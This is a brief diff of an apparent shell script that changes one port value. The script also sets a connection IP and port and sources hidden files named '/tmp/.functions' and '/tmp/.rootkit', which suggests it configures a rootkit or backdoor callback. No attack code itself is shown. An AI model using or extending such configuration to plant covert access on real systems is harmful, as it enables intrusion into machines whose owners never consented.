@@ -2,7 +2,7 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15986"
+portp="15952"
 
 source /tmp/.functions
 source /tmp/.rootkit
